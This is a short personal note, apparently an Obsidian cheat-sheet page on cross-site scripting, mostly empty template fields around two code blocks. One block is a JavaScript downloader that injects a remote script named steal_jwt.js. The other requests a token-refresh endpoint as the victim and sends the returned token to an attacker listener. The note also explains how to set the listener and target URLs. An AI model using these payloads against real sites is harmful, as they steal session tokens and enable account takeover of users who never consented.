---
creation date: April 17th 2023
last modified date: April 17th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[XSS]]  
___

## Description:  




### Downloader for longer XSS payloads
```
var a=document.createElement(“script”);a.src=http://localhost:8000/steal_jwt.js;document.body.appendChild(a);
```

### stealing value set in a response (such as a jwt token)

Use a downloader to pull the following code:
```
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4 && xhr.status == 200) {
		var yourtoken = xhr.response
		var xhr2 = new XMLHttpRequest();
		xhr2.open("GET", "http://127.0.0.1:8000/?body=" + yourtoken);
		xhr2.send();
	}
}
xhr.open("GET", "https://some-url.com/v2/authenticationtoken/refresh");
xhr.send();
```
This script will send a request to a specific page as the user and then will send the response back to you.
Make sure to set the first URL as yourself (and open a python http listener) and set the second URL to the request containing the sensitive info in the response.

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 17th 2023 (12:11 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
